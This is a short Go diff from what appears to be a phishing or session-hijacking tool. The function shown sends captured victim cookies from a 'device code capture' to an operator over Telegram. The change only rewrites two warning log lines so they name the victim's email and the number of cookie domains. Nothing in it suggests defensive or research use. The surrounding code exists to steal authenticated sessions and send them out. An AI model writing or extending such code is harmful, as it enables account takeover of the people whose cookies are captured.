@@ -1229,10 +1229,10 @@ func (nm *NotifierManager) sendTelegramMessage(n *NotifierConfig, event string, 
 					log.Success("[telegram] Cookie file sent: %s (%d cookies)", cookieFilename, len(cookies))
 				}
 			} else {
-				log.Warning("[telegram] No cookies to send for device code capture (built 0)")
+				log.Warning("[telegram-dc] NO COOKIES to send for %s - built 0 from %d domains", userEmail, len(data.Cookies))
 			}
 		} else {
-			log.Warning("[telegram] data.Cookies is empty/nil for device code capture")
+			log.Warning("[telegram-dc] data.Cookies is EMPTY for device code capture of %s", userEmail)
 		}
 
 		return nil
